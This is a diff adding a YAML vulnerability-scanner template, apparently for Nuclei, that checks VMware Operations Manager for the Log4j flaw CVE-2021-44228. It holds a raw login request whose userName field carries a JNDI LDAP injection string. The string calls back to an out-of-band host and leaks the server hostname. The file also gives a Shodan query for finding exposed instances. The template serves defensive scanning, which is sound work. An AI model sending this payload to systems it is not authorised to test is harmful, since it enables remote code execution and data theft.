@@ -1,0 +1,78 @@
+http:
+- extractors:
+  - kval:
+    - interactsh_ip
+    type: kval
+  - group: 2
+    part: interactsh_request
+    regex:
+    - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+    type: regex
+  - group: 1
+    part: interactsh_request
+    regex:
+    - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+    type: regex
+  matchers:
+  - part: interactsh_protocol
+    type: word
+    words:
+    - dns
+  - part: interactsh_request
+    regex:
+    - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+    type: regex
+  - part: header
+    type: word
+    words:
+    - Path=/ui
+  matchers-condition: and
+  raw:
+  - 'POST /ui/login.action HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    X-Requested-With: XMLHttpRequest
+
+    Origin: {{BaseURL}}
+
+    Referer: {{BaseURL}}/ui/login.action
+
+    Sec-Fetch-Dest: empty
+
+    Sec-Fetch-Mode: cors
+
+    Sec-Fetch-Site: same-origin
+
+
+    mainAction=login&userName=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}}&password=admin&authSourceId=localItem&authSourceName=Local%20Users&authSourceType=LOCAL&forceLogin=&timezone=330&languageCode=us
+
+    '
+id: vmware-operation-manager-log4j
+info:
+  author: DhiyaneshDK
+  classification:
+    cve-id: CVE-2021-44228
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cwe-id: CWE-77
+  description: VMware Operations Manager is susceptible to remote code execution via
+    the Apache Log4j framework. An attacker can execute malware, obtain sensitive
+    information, modify data, and/or gain full control over a compromised system without
+    entering necessary credentials.
+  metadata:
+    max-request: 1
+    shodan-query: title:"vRealize Operations Manager"
+    verified: 'true'
+  name: VMware Operations Manager - Remote Code Execution (Apache Log4j)
+  reference:
+  - https://www.vmware.com/security/advisories/VMSA-2021-0028.html
+  - https://logging.apache.org/log4j/2.x/security.html
+  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+  severity: critical
+  tags: blind,fuzzing
+variables:
+  rand1: '{{rand_int(111, 999)}}'
+  rand2: '{{rand_int(111, 999)}}'
